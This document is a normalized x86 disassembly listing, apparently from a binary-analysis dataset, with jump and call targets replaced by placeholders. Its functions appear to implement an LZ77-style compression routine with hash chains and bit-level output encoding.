sub_4010a0
push ebp
mov ebp esp
xor edx edx
mov eax ecx
div [ ebp + 0x8 ]
cmp eax 0x4
je r-xdata
test ecx ecx
je r-xdata
xor eax eax
pop ebp
retn
push ecx
call [ rwxdata ]
add esp 0x4
pop ebp
retn
sub_4010f0
push ebp
mov ebp esp
mov edx [ eax ]
sub esp 0x10
push ebx
mov ebx [ ebp + 0x8 ]
xor ecx ecx
sub edx ebx
mov [ eax + 0x58 ] edx
mov [ eax + 0x5c ] ecx
cmp ebx ecx
jbe r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x64 ]
mov [ ebp - 0x4 ] edx
mov edx [ eax + 0x4 ]
inc edx
mov [ ebp - 0x8 ] edx
mov edx [ eax + 0x70 ]
push esi
mov esi [ eax + 0x6c ]
mov [ ebp - 0xc ] edx
mov edx [ eax + 0x74 ]
push edi
mov edi [ eax + 0x68 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x60 ]
sub edi esi
movzx eax [ edx + ecx + 0x1 ]
dec ebx
mov [ ebp + 0x8 ] ebx
movzx ebx [ edx + ecx ]
shl ebx 0x5
xor eax ebx
movzx ebx [ edx + ecx + 0x2 ]
shl eax 0x5
xor eax ebx
mov ebx [ ebp - 0x4 ]
imul eax eax 0x9f5f
shr eax 0x5
and eax 0xffff
mov ebx [ ebx + eax * 4 ]
mov [ edi + esi ] ebx
mov ebx [ ebp - 0x4 ]
mov [ ebx + eax * 4 ] ecx
mov ebx [ ebp - 0x8 ]
mov [ esi ] ebx
mov ebx [ ebp - 0xc ]
inc [ ebx + eax * 4 ]
movzx eax [ edx + ecx ]
mov ebx [ ebp - 0x10 ]
mov [ ebx + eax * 4 ] ecx
mov ebx [ ebp + 0x8 ]
inc ecx
add esi 0x4
test ebx ebx
jne r-xdata
pop edi
pop esi
sub_4011a0
push ebp
mov ebp esp
sub esp 0x8
push edi
xor edi edi
mov [ esi + 0x60 ] edi
mov [ esi + 0x64 ] edi
mov [ esi + 0x68 ] edi
mov [ esi + 0x6c ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0x74 ] edi
cmp [ esi ] edi
jne r-xdata
cmp [ esi + 0x4 ] edi
jne r-xdata
mov [ esi ] 0x800000
mov ecx [ esi ]
mov [ esi + 0x8 ] 0x1
cmp ecx 0x800000
ja r-xdata
mov [ esi + 0x4 ] 0x800
mov eax 0xfffffffe
pop edi
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x4 ]
cmp eax 0x800
ja r-xdata
lea eax [ ecx + eax * 2 ]
cmp eax edi
ja r-xdata
push eax
call [ rwxdata ]
add esp 0x4
xor eax eax
jmp r-xdata
xor eax eax
xor edx edx
mov eax ebx
div ecx
cmp eax 0x4
jne r-xdata
push ebx
push 0x40000
mov [ esi + 0x60 ] eax
call [ rwxdata ]
mov ecx [ esi + 0x4 ]
add esp 0x4
add ecx [ esi ]
mov [ esi + 0x64 ] eax
lea ebx [ ecx * 4 ]
je r-xdata
xor eax eax
xor edx edx
mov eax ebx
div ecx
cmp eax 0x4
jne r-xdata
cmp ebx edi
jbe r-xdata
pop ebx
mov eax 0xfffffffd
pop edi
mov esp ebp
pop ebp
retn
cmp [ esi + 0x64 ] edi
je r-xdata
cmp ebx edi
jbe r-xdata
push ebx
call [ rwxdata ]
add esp 0x4
jmp r-xdata
cmp [ esi + 0x68 ] edi
je r-xdata
push ebx
call [ rwxdata ]
add esp 0x4
jmp r-xdata
mov ecx [ esi + 0x4 ]
add ecx [ esi ]
mov [ esi + 0x68 ] eax
lea ebx [ ecx * 4 ]
je r-xdata
cmp [ esi + 0x6c ] edi
je r-xdata
push 0x40000
mov [ esi + 0x6c ] eax
call [ rwxdata ]
add esp 0x4
mov [ esi + 0x70 ] eax
cmp [ esi + 0x60 ] edi
je r-xdata
cmp eax edi
je r-xdata
push 0x40000
call [ rwxdata ]
add esp 0x4
mov [ ebp - 0x4 ] eax
mov [ esi + 0x74 ] eax
cmp eax edi
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
lea ebx [ eax + ecx ]
mov [ esi + 0x14 ] eax
add eax ebx
mov [ esi + 0x10 ] 0x800
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x50 ] ebx
cmp eax 0xffffffff
jb r-xdata
mov eax [ esi + 0x60 ]
push 0x40000
mov [ esi + 0x58 ] ecx
mov ecx [ esi + 0x70 ]
add eax ebx
push edi
push ecx
mov [ esi + 0x54 ] eax
call sub_4105f0
mov edx [ ebp - 0x4 ]
push 0x40000
push 0xff
push edx
call sub_4105f0
mov [ esi + 0x44 ] edi
mov [ esi + 0x3c ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x40 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x5c ] edi
mov edi [ esi + 0x30 ]
mov ecx [ edi + 0x1c ]
mov eax [ edi + 0x24 ]
add esp 0x18
sub eax ecx
mov [ esi + 0x28 ] eax
je r-xdata
pop ebx
or eax 0xffffffff
pop edi
mov esp ebp
pop ebp
retn
cmp [ esi + 0x44 ] ebx
jne r-xdata
mov edx [ esi + 0x4 ]
cmp eax edx
jbe r-xdata
mov eax [ esi ]
mov [ esi + 0x4c ] 0x0
test eax eax
jne r-xdata
mov [ esi + 0x44 ] 0x0
mov eax [ esi + 0x28 ]
push eax
mov eax [ esi + 0x60 ]
push ecx
push eax
call sub_411080
mov ecx [ esi + 0x28 ]
mov edx ecx
add esp 0xc
add [ edi + 0x1c ] ecx
mov [ esi + 0x44 ] edx
mov [ esi + 0x28 ] edx
sub ebx eax
mov [ esi + 0x4c ] ebx
pop ebx
xor eax eax
pop edi
mov esp ebp
pop ebp
retn
neg eax
pop ebx
mov [ esi + 0x4c ] eax
xor eax eax
pop edi
mov esp ebp
pop ebp
retn
sub_4013c0
mov eax [ esi + 0x74 ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov eax [ esi + 0x70 ]
mov [ esi + 0x74 ] edi
cmp eax edi
je r-xdata
push eax
call [ rwxdata ]
add esp 0x4
mov eax [ esi + 0x6c ]
mov [ esi + 0x70 ] edi
cmp eax edi
je r-xdata
push eax
call [ rwxdata ]
add esp 0x4
mov eax [ esi + 0x68 ]
mov [ esi + 0x6c ] edi
cmp eax edi
je r-xdata
push eax
call [ rwxdata ]
add esp 0x4
mov eax [ esi + 0x64 ]
mov [ esi + 0x68 ] edi
cmp eax edi
je r-xdata
push eax
call [ rwxdata ]
add esp 0x4
mov eax [ esi + 0x60 ]
mov [ esi + 0x64 ] edi
cmp eax edi
je r-xdata
push eax
call [ rwxdata ]
add esp 0x4
mov [ esi + 0x60 ] edi
pop edi
retn
push eax
call [ rwxdata ]
add esp 0x4
sub_401440
mov ecx [ eax + 0x30 ]
mov edx [ ecx + 0x1c ]
push esi
cmp edx [ ecx + 0x24 ]
jae r-xdata
mov ecx [ eax + 0x28 ]
test ecx ecx
je r-xdata
mov esi edx
movzx edx [ esi ]
inc esi
mov [ ecx + 0x1c ] esi
test edx edx
jns r-xdata
mov ecx [ eax + 0x50 ]
mov esi 0x1
add [ eax + 0x44 ] esi
cmp [ eax + 0x44 ] ecx
jne r-xdata
dec ecx
mov [ eax + 0x28 ] ecx
jmp r-xdata
mov ecx [ eax + 0x44 ]
mov esi [ eax + 0x60 ]
mov [ ecx + esi ] dl
cmp ecx [ eax + 0x4 ]
jae r-xdata
add [ eax + 0x48 ] esi
cmp [ eax + 0x48 ] ecx
jne r-xdata
mov [ eax + 0x44 ] 0x0
mov esi [ eax + 0x54 ]
mov [ ecx + esi ] dl
add [ eax + 0x4c ] esi
pop esi
cmp [ eax + 0x4c ] ecx
jne r-xdata
mov [ eax + 0x48 ] 0x0
retn
mov [ eax + 0x4c ] 0x0
sub_4014c0
mov eax [ edx + 0x58 ]
test eax eax
jne r-xdata
dec eax
mov [ edx + 0x58 ] eax
mov ecx [ edx + 0x60 ]
movzx eax [ ecx + esi ]
add ecx esi
shl eax 0x5
push edi
movzx edi [ ecx + 0x1 ]
xor eax edi
movzx edi [ ecx + 0x2 ]
shl eax 0x5
xor eax edi
mov edi [ edx + 0x70 ]
imul eax eax 0x9f5f
shr eax 0x5
and eax 0xffff
dec [ edi + eax * 4 ]
lea eax [ edi + eax * 4 ]
movzx eax [ ecx ]
mov ecx [ edx + 0x74 ]
lea eax [ ecx + eax * 4 ]
pop edi
cmp [ eax ] esi
jne r-xdata
retn
mov [ eax ] 0xffffffff
retn
sub_401520
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
mov esp ebp
pop ebp
retn
mov eax [ edx + 0x4 ]
mov ecx [ edx + 0x48 ]
inc eax
push ebx
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x58 ]
push esi
mov esi [ edx + 0x60 ]
push edi
mov edi [ edx + 0x4c ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x44 ]
mov [ ebp - 0xc ] edi
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x8 ]
movzx eax [ esi + edi ]
movzx ebx [ esi + edi + 0x1 ]
shl eax 0x5
xor eax ebx
movzx ebx [ esi + edi + 0x2 ]
shl eax 0x5
xor eax ebx
mov ebx [ edx + 0x70 ]
imul eax eax 0x9f5f
shr eax 0x5
and eax 0xffff
dec [ ebx + eax * 4 ]
movzx ebx [ esi + edi ]
mov eax [ edx + 0x74 ]
cmp [ eax + ebx * 4 ] edi
jne r-xdata
mov eax [ edx + 0x28 ]
test eax eax
je r-xdata
movzx ebx [ eax ]
inc eax
mov [ edi + 0x1c ] eax
test ebx ebx
jns r-xdata
movzx edi [ esi + ecx ]
movzx eax [ esi + ecx + 0x1 ]
shl edi 0x5
xor eax edi
movzx edi [ esi + ecx + 0x2 ]
shl eax 0x5
xor eax edi
mov edi [ edx + 0x64 ]
imul eax eax 0x9f5f
shr eax 0x5
and eax 0xffff
mov ebx [ edi + eax * 4 ]
mov edi [ edx + 0x68 ]
mov [ edi + ecx * 4 ] ebx
mov edi [ edx + 0x64 ]
mov ebx [ ebp - 0x10 ]
mov [ edi + eax * 4 ] ecx
mov edi [ edx + 0x6c ]
mov [ edi + ecx * 4 ] ebx
mov edi [ edx + 0x70 ]
inc [ edi + eax * 4 ]
movzx edi [ esi + ecx ]
mov eax [ edx + 0x74 ]
mov [ eax + edi * 4 ] ecx
mov edi [ edx + 0x30 ]
mov eax [ edi + 0x1c ]
cmp eax [ edi + 0x24 ]
jae r-xdata
mov [ eax + ebx * 4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
dec eax
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + eax ] bl
cmp eax [ edx + 0x4 ]
jae r-xdata
inc ecx
cmp ecx ebx
jne r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
mov ebx [ edx + 0x50 ]
inc eax
mov [ ebp - 0x4 ] eax
cmp eax ebx
jne r-xdata
mov edi [ edx + 0x54 ]
mov [ eax + edi ] bl
jmp r-xdata
mov edi [ ebp - 0xc ]
inc edi
mov [ ebp - 0xc ] edi
cmp edi ebx
jne r-xdata
xor ecx ecx
dec [ ebp + 0x8 ]
jne r-xdata
xor edi edi
mov [ ebp - 0xc ] edi
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov esi [ ebp - 0x8 ]
mov [ edx + 0x4c ] edi
pop edi
mov [ edx + 0x58 ] esi
pop esi
mov [ edx + 0x48 ] ecx
mov [ edx + 0x44 ] eax
pop ebx
sub_401670
push ebp
mov ebp esp
push ecx
mov edx [ esi + 0x20 ]
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi [ esi + 0x48 ]
add edi [ esi + 0x60 ]
cmp [ ebp + 0xc ] 0x0
mov al [ edi + edx - 0x1 ]
mov [ ebp - 0x1 ] al
jbe r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn
nop
cmp [ ebp + 0xc ] 0x0
mov eax [ esi + 0x68 ]
mov ebx [ eax + ebx * 4 ]
mov [ ebp + 0x8 ] ebx
ja r-xdata
mov cl [ eax + edx ]
cmp cl [ edi + edx ]
jne r-xdata
mov eax [ esi + 0x60 ]
mov cl [ ebp - 0x1 ]
dec [ ebp + 0xc ]
add eax ebx
cmp [ eax + edx - 0x1 ] cl
jne r-xdata
mov cl [ eax ]
cmp cl [ edi ]
jne r-xdata
mov cl [ eax + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
lea ecx [ edi + 0x2 ]
add eax 0x2
lea ecx [ ecx ]
mov ebx [ ebp + 0x8 ]
sub ecx edi
cmp ecx edx
jbe r-xdata
mov bl [ ecx ]
inc eax
cmp bl [ eax ]
je r-xdata
mov edx ecx
mov [ esi + 0x20 ] ecx
mov [ esi + 0x34 ] ebx
cmp ecx [ esi + 0x28 ]
je r-xdata
mov ebx [ esi + 0x28 ]
inc ecx
add ebx edi
cmp ecx ebx
jae r-xdata
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov eax [ esi + 0x6c ]
cmp ecx [ eax + ebx * 4 ]
ja r-xdata
mov cl [ ecx + edi - 0x1 ]
mov [ ebp - 0x1 ] cl
sub_401710
mov edx [ eax + 0x48 ]
mov ecx [ eax + 0x60 ]
movzx ecx [ ecx + edx ]
mov edx [ eax + 0x74 ]
mov ecx [ edx + ecx * 4 ]
cmp ecx 0xffffffff
jne r-xdata
mov edx 0x2
cmp [ eax + 0x20 ] edx
jae r-xdata
xor eax eax
retn
mov eax 0x1
retn
mov [ eax + 0x20 ] edx
mov [ eax + 0x34 ] ecx
sub_401740
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov esi eax
mov edx [ esi + 0x48 ]
mov eax [ esi + 0x60 ]
lea ecx [ edx + eax ]
movzx eax [ ecx ]
push edi
movzx edi [ ecx + 0x1 ]
shl eax 0x5
xor eax edi
movzx edi [ ecx + 0x2 ]
mov ebx [ esi + 0x68 ]
shl eax 0x5
xor eax edi
mov edi [ esi + 0x64 ]
imul eax eax 0x9f5f
shr eax 0x5
and eax 0xffff
lea edi [ edi + eax * 4 ]
mov [ ebp - 0x4 ] edi
mov edi [ edi ]
mov [ ebx + edx * 4 ] edi
mov [ ebp - 0x8 ] edi
mov edi [ esi + 0x70 ]
lea eax [ edi + eax * 4 ]
mov edi [ eax ]
lea ebx [ edi + 0x1 ]
mov [ eax ] ebx
mov eax [ esi + 0x10 ]
cmp edi eax
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ esi + 0x28 ]
mov [ eax ] edx
movzx eax [ ecx ]
mov [ esi + 0x2c ] eax
mov eax [ esi + 0x20 ]
mov [ ebp - 0x4 ] eax
cmp eax ebx
jb r-xdata
test eax eax
je r-xdata
movzx ecx [ ecx ]
mov edx [ esi + 0x74 ]
mov ecx [ edx + ecx * 4 ]
cmp ecx 0xffffffff
je r-xdata
test ebx ebx
jne r-xdata
mov edi eax
mov edi [ esi + 0x20 ]
cmp edi [ ebp - 0x4 ]
jbe r-xdata
cmp eax 0x2
jae r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ esi + 0x6c ]
inc ecx
mov [ esi + 0x24 ] 0x0
mov [ eax + edx * 4 ] ecx
jmp r-xdata
mov [ esi + 0x2c ] 0xffffffff
mov edx [ esi + 0x48 ]
mov ecx [ esi + 0x6c ]
mov [ ecx + edx * 4 ] edi
mov ecx [ esi + 0x48 ]
mov edx [ esi + 0x34 ]
cmp ecx edx
jbe r-xdata
cmp ebx 0x3
jb r-xdata
mov [ esi + 0x20 ] 0x2
mov [ esi + 0x34 ] ecx
mov eax [ esi + 0x58 ]
mov edi [ esi + 0x4c ]
test eax eax
jne r-xdata
dec eax
mov [ esi + 0x58 ] eax
mov eax [ esi + 0x60 ]
movzx ebx [ edi + eax ]
lea ecx [ edi + eax ]
movzx eax [ ecx + 0x1 ]
shl ebx 0x5
xor eax ebx
movzx ebx [ ecx + 0x2 ]
shl eax 0x5
xor eax ebx
mov ebx [ esi + 0x70 ]
imul eax eax 0x9f5f
shr eax 0x5
and eax 0xffff
dec [ ebx + eax * 4 ]
lea eax [ ebx + eax * 4 ]
movzx eax [ ecx ]
mov ecx [ esi + 0x74 ]
cmp [ ecx + eax * 4 ] edi
lea eax [ ecx + eax * 4 ]
jne r-xdata
mov eax [ esi + 0x50 ]
sub eax edx
add eax ecx
sub ecx edx
mov eax ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
push edi
push eax
call sub_401670
add esp 0x8
mov eax [ esi + 0x60 ]
movzx ecx [ edx + eax ]
mov eax [ esi + 0x74 ]
pop edi
pop esi
mov [ eax + ecx * 4 ] edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ eax ] 0xffffffff
mov eax [ esi + 0x60 ]
movzx ecx [ edx + eax ]
mov eax [ esi + 0x74 ]
pop edi
pop esi
mov [ eax + ecx * 4 ] edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ esi + 0x24 ] eax
sub_4018c0
push ebp
mov ebp esp
push ebx
push esi
push edi
xor edi edi
mov esi ecx
mov [ eax ] 0x1
mov [ esi + 0x30 ] eax
mov [ eax + 0x14 ] edi
mov [ eax + 0x10 ] edi
mov [ eax + 0x7c ] edi
mov [ eax + 0x78 ] edi
mov [ eax + 0x74 ] edi
mov [ eax + 0x88 ] edi
mov [ eax + 0x84 ] edi
mov [ eax + 0x80 ] edi
mov [ eax + 0x8c ] edi
call sub_4011a0
mov ebx eax
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x8 ]
and eax 0x1
pop edi
mov [ esi + 0x18 ] eax
pop esi
xor eax eax
pop ebx
pop ebp
retn
call sub_4013c0
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
sub_401930
push ebp
mov ebp esp
push esi
mov esi eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
sub esi eax
mov ecx esi
sub ecx eax
push ecx
mov edx ebx
call sub_401520
sub esi [ ebp + 0x8 ]
add esp 0x4
inc esi
jmp r-xdata
mov ecx [ ebx + 0x28 ]
inc ecx
mov [ edi + 0x4 ] ecx
mov esi ebx
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] eax
call sub_4013c0
jmp r-xdata
add [ edi + 0x74 ] esi
mov eax ebx
mov [ ebx + 0x20 ] 0x1
call sub_401740
mov eax [ ebx + 0x24 ]
mov edx [ ebx + 0x20 ]
mov [ edi + 0xc ] eax
mov eax ebx
mov [ edi + 0x8 ] edx
call sub_401440
xor eax eax
cmp [ ebx + 0x2c ] eax
jge r-xdata
xor eax eax
pop ebp
retn
mov ecx [ edi + 0x74 ]
cmp ecx [ edi + 0x7c ]
jbe r-xdata
mov edx [ edi + 0x1c ]
sub edx [ edi + 0x4 ]
mov eax [ edi + 0x70 ]
mov [ edi + 0x18 ] edx
pop esi
test eax eax
je r-xdata
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push edx
mov edx [ edi + 0x78 ]
push 0x3
push edx
push ecx
call eax
add esp 0x10
add [ edi + 0x7c ] 0x400
sub_4019d0
push esi
xor esi esi
cmp edx 0xffffffff
je r-xdata
cmp eax 0xffffffff
je r-xdata
cmp edx esi
je r-xdata
mov [ ecx + 0x2c ] esi
mov [ ecx + 0x30 ] esi
mov [ ecx + 0x40 ] esi
mov [ ecx + 0x44 ] esi
xor eax eax
pop esi
retn
cmp eax 0x8
je r-xdata
mov [ ecx + 0x34 ] esi
or eax 0xffffffff
pop esi
retn
mov [ ecx + 0x38 ] eax
cdq
and edx 0x7
add eax edx
sar eax 0x3
mov [ ecx + 0x3c ] eax
cmp eax 0x10
je r-xdata
cmp eax 0x20
jne r-xdata
sub_401a20
mov ecx [ esi + 0x40 ]
mov eax [ esi + 0x2c ]
mov [ ecx ] al
cmp [ esi + 0x38 ] 0x10
jb r-xdata
retn
mov edx eax
shr edx 0x8
mov [ ecx + 0x1 ] dl
cmp [ esi + 0x38 ] 0x20
jne r-xdata
mov edx eax
shr edx 0x10
shr eax 0x18
mov [ ecx + 0x2 ] dl
mov [ ecx + 0x3 ] al
sub_401a50
mov ecx [ eax + 0x30 ]
push esi
cmp ecx [ eax + 0x38 ]
jae r-xdata
mov esi [ eax + 0x40 ]
mov ecx [ eax + 0x2c ]
mov [ esi ] cl
cmp [ eax + 0x38 ] 0x10
jb r-xdata
test ecx ecx
jne r-xdata
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x3c ]
add edx ecx
mov [ eax + 0x40 ] ecx
mov [ eax + 0x44 ] edx
mov [ eax + 0x2c ] edi
mov [ eax + 0x30 ] 0x1
pop esi
retn
mov edx ecx
shr edx 0x8
mov [ esi + 0x1 ] dl
cmp [ eax + 0x38 ] 0x20
jne r-xdata
mov edx [ eax + 0x2c ]
lea edx [ edi + edx * 2 ]
inc ecx
mov [ eax + 0x2c ] edx
mov [ eax + 0x30 ] ecx
pop esi
retn
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x3c ]
add esi edx
mov [ eax + 0x40 ] edx
mov [ eax + 0x44 ] esi
mov edx ecx
shr edx 0x10
shr ecx 0x18
mov [ esi + 0x2 ] dl
mov [ esi + 0x3 ] cl
sub_401ad0
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
mov [ eax + 0x40 ] 0x0
retn
push esi
cmp ecx [ eax + 0x38 ]
je r-xdata
mov esi [ eax + 0x40 ]
mov ecx [ eax + 0x2c ]
mov [ esi ] cl
cmp [ eax + 0x38 ] 0x10
jb r-xdata
mov ecx [ eax + 0x30 ]
cmp ecx [ eax + 0x38 ]
jae r-xdata
xor ecx ecx
mov [ eax + 0x30 ] ecx
mov [ eax + 0x40 ] ecx
pop esi
retn
mov edx ecx
shr edx 0x8
mov [ esi + 0x1 ] dl
cmp [ eax + 0x38 ] 0x20
jne r-xdata
mov esi [ eax + 0x40 ]
mov ecx [ eax + 0x2c ]
mov [ esi ] cl
cmp [ eax + 0x38 ] 0x10
jb r-xdata
test ecx ecx
jne r-xdata
mov edx ecx
shr edx 0x10
shr ecx 0x18
mov [ esi + 0x2 ] dl
mov [ esi + 0x3 ] cl
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x3c ]
add edx ecx
mov [ eax + 0x40 ] ecx
mov [ eax + 0x44 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x30 ] 0x1
mov edx ecx
shr edx 0x8
mov [ esi + 0x1 ] dl
cmp [ eax + 0x38 ] 0x20
jne r-xdata
mov edx [ eax + 0x2c ]
add edx edx
inc ecx
mov [ eax + 0x2c ] edx
mov [ eax + 0x30 ] ecx
jmp r-xdata
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x3c ]
add esi edx
mov [ eax + 0x40 ] edx
mov [ eax + 0x44 ] esi
mov edx ecx
shr edx 0x10
shr ecx 0x18
mov [ esi + 0x2 ] dl
mov [ esi + 0x3 ] cl
mov ecx [ eax + 0x30 ]
cmp ecx [ eax + 0x38 ]
jne r-xdata
sub_401ba0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
cmp edi 0x2
jb r-xdata
and edi 0x1
call sub_401a50
mov edi 0x1
call sub_401a50
pop edi
pop ebp
retn
push ebx
add edi 0x2
push esi
mov esi 0x4
mov [ ebp + 0x8 ] edi
lea ecx [ ecx ]
add esi esi
cmp edi esi
jae r-xdata
shr esi 0x1
mov edi [ eax + 0x40 ]
mov edx [ eax + 0x2c ]
mov [ edi ] dl
cmp [ eax + 0x38 ] 0x10
jb r-xdata
test edx edx
jne r-xdata
mov edx [ eax + 0x44 ]
mov edi [ eax + 0x3c ]
add edi edx
mov [ eax + 0x40 ] edx
mov [ eax + 0x44 ] edi
mov [ eax + 0x30 ] 0x1
mov ebx edx
shr ebx 0x8
mov [ edi + 0x1 ] bl
cmp [ eax + 0x38 ] 0x20
jne r-xdata
mov edi [ eax + 0x2c ]
inc edx
lea ecx [ ecx + edi * 2 ]
mov [ eax + 0x30 ] edx
jmp r-xdata
mov edi [ eax + 0x44 ]
mov ebx [ eax + 0x3c ]
add ebx edi
mov [ eax + 0x40 ] edi
mov [ eax + 0x44 ] ebx
mov edi [ eax + 0x40 ]
mov ecx [ eax + 0x2c ]
mov [ edi ] cl
cmp [ eax + 0x38 ] 0x10
jb r-xdata
test ecx ecx
jne r-xdata
mov ebx edx
shr ebx 0x10
shr edx 0x18
mov [ edi + 0x2 ] bl
mov [ edi + 0x3 ] dl
mov [ eax + 0x2c ] ecx
mov ecx [ eax + 0x30 ]
cmp ecx [ eax + 0x38 ]
jae r-xdata
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x3c ]
add edx ecx
mov [ eax + 0x40 ] ecx
mov [ eax + 0x44 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x30 ] 0x1
mov edx ecx
shr edx 0x8
mov [ edi + 0x1 ] dl
cmp [ eax + 0x38 ] 0x20
jne r-xdata
shl [ eax + 0x2c ] 0x1
inc ecx
mov [ eax + 0x30 ] ecx
jmp r-xdata
mov edx [ eax + 0x44 ]
mov edi [ eax + 0x3c ]
add edi edx
mov [ eax + 0x40 ] edx
mov [ eax + 0x44 ] edi
mov edx [ eax + 0x30 ]
shr esi 0x1
mov ecx esi
and ecx edi
neg ecx
sbb ecx ecx
neg ecx
cmp edx [ eax + 0x38 ]
jae r-xdata
pop esi
pop ebx
mov edx ecx
shr edx 0x10
shr ecx 0x18
mov [ edi + 0x2 ] dl
mov [ edi + 0x3 ] cl
mov edi [ ebp + 0x8 ]
cmp esi 0x2
ja r-xdata
sub_401cd0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x54 ]
push edi
cmp ebx eax
jbe r-xdata
mov eax [ esi + 0x6c ]
add [ esi + 0x84 ] ebx
cmp ebx [ eax + 0xc ]
jbe r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
add eax 0xfffffffd
push eax
push esi
call sub_401cd0
mov eax [ esi + 0x54 ]
mov edx 0x3
sub edx eax
add ebx edx
add esp 0xc
cmp ebx eax
ja r-xdata
mov eax [ esi + 0x6c ]
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0x4 ]
jbe r-xdata
mov [ eax + 0xc ] ebx
xor edi edi
mov eax esi
call sub_401a50
mov eax [ ebp + 0x10 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov [ eax + 0x4 ] ecx
dec eax
shr eax 0x8
inc eax
push eax
mov eax esi
call sub_401ba0
movzx eax [ ebp + 0x10 ]
mov ecx [ esi + 0x44 ]
dec al
add esp 0x4
mov [ ecx ] al
inc [ esi + 0x44 ]
mov eax esi
call sub_401a50
mov edi 0x1
call sub_401a50
jmp r-xdata
mov eax 0x1
cmp eax ebx
sbb edi edi
neg edi
mov eax esi
call sub_401a50
mov edi ebx
and edi 0x1
call sub_401a50
mov ecx [ ebp + 0x10 ]
pop edi
mov [ esi + 0x14 ] ecx
pop esi
pop ebx
pop ebp
retn
xor edi edi
mov eax esi
call sub_401a50
call sub_401a50
add ebx 0xfffffffc
push ebx
call sub_401ba0
mov edx [ ebp + 0x10 ]
add esp 0x4
pop edi
mov [ esi + 0x14 ] edx
pop esi
pop ebx
pop ebp
retn
mov edx 0xd00
cmp edx [ ebp + 0x10 ]
sbb eax eax
neg eax
or ecx 0xffffffff
sub ecx eax
add ebx ecx
cmp ebx 0x4
jb r-xdata
sub_401dd0
push ebp
mov ebp esp
push edi
mov edi ecx
test edi edi
je r-xdata
pop edi
pop ebp
retn
mov ecx [ eax + 0x6c ]
add [ eax + 0x80 ] edi
cmp edi [ ecx + 0x14 ]
jbe r-xdata
push ebx
push esi
mov ebx 0x1
mov [ ecx + 0x14 ] edi
mov esi [ eax + 0x40 ]
mov ecx [ eax + 0x2c ]
mov [ esi ] cl
cmp [ eax + 0x38 ] 0x10
jb r-xdata
test ecx ecx
jne r-xdata
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x3c ]
add edx ecx
mov [ eax + 0x40 ] ecx
mov [ eax + 0x44 ] edx
mov [ eax + 0x2c ] ebx
mov [ eax + 0x30 ] ebx
mov edx ecx
shr edx 0x8
mov [ esi + 0x1 ] dl
cmp [ eax + 0x38 ] 0x20
jne r-xdata
mov edx [ eax + 0x2c ]
lea edx [ edx + edx + 0x1 ]
inc ecx
mov [ eax + 0x2c ] edx
mov [ eax + 0x30 ] ecx
jmp r-xdata
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x3c ]
add esi edx
mov [ eax + 0x40 ] edx
mov [ eax + 0x44 ] esi
mov ecx [ eax + 0x30 ]
cmp ecx [ eax + 0x38 ]
jae r-xdata
pop esi
pop ebx
mov edx ecx
shr edx 0x10
shr ecx 0x18
mov [ esi + 0x2 ] dl
mov [ esi + 0x3 ] cl
mov esi [ ebp + 0x8 ]
mov dl [ esi ]
mov ecx [ eax + 0x44 ]
mov [ ecx ] dl
add [ eax + 0x44 ] ebx
add esi ebx
sub edi ebx
mov [ ebp + 0x8 ] esi
jne r-xdata
sub_401e80
cmp edx 0x2
jb r-xdata
or eax 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x50 ]
ja r-xdata
cmp ecx 0xd00
ja r-xdata
push esi
mov esi 0xd00
cmp esi ecx
sbb esi esi
push edi
neg esi
mov edi 0xfffffffe
sub edi esi
add edx edi
pop edi
pop esi
cmp ecx [ eax + 0x14 ]
jne r-xdata
dec ecx
shr ecx 0x8
mov eax 0xb
test ecx ecx
je r-xdata
mov eax 0x3
jmp r-xdata
add eax 0x2
cmp edx 0x3
jb r-xdata
add eax 0x2
shr ecx 0x1
jne r-xdata
retn
sub edx 0x3
add eax 0x2
shr edx 0x1
jne r-xdata
retn
sub_401ef0
